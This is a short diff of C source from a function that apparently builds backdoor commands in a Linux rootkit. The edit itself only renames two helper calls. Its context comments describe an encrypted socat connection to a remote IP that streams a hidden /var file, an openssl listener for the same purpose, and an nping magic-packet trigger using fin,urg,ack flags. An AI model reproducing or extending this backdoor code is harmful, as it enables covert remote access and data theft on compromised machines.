@@ -160,7 +160,8 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                      * same as RR_SOCAT but on dst port RR_SOCAT_TTY
                      */
                     //"%s OPENSSL:%s:%s,verify=0 EXEC:\"tail -F -n +1 /var/.<random>\""
-                    char *tty = sys_ttyfile(false);
+
+                    char *tty = sys_get_ttyfile();
                     if (tty) {
                         int len;
                         char ip[INET_ADDRSTRLEN+1] = {0};
@@ -194,7 +195,8 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                      * openssl s_server -key key.pem -cert cert.pem -accept <#PORT>
                      * trigger: nping <IP> --tcp -p RR_OPENSSL --flags fin,urg,ack --source-port <#PORT> -c 1
                      */
-                    char *ssl = sys_sslfile(false);
+
+                    char *ssl = sys_get_sslfile();
                     if (ssl) {
                         int len;
                         char ip[INET_ADDRSTRLEN+1] = {0};
